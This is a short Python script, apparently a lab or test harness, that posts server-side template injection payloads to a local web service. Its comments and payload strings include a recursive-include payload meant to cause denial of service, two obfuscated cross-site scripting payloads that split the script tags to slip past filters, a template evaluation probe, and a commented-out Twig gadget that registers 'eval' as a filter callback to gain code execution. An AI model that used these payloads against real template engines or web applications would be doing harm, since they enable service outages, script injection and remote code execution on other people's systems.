import requests

def sendPayload(payload_arg="me"):
    url = "http://127.0.0.1:5022/"
    result1 = requests.post(url,data={"name":payload_arg}).text
    return result1

#DOS if we recursivly include the template it may cause Denial of Service
payload = '{{include("index")}}'

#XSS
#payload = '{% set foo = "<s"."cript>"."alert(1)"."<"."/script".">" %}{foo}';
#payload = '{% set x1,x2,x3,x4,x5 ="<s","cript>alert(1);","<","/script",">"%}{{x1}}{{x2}}{{x3}}{{x4}}{{x5}}';
payload ='{{1+1}}';
#payload ='{{this}}'

#payload ='{{_self.env.registerUndefinedFilterCallback("eval")}}{{_self.env.getFilter("idx")}}'
print sendPayload(payload)


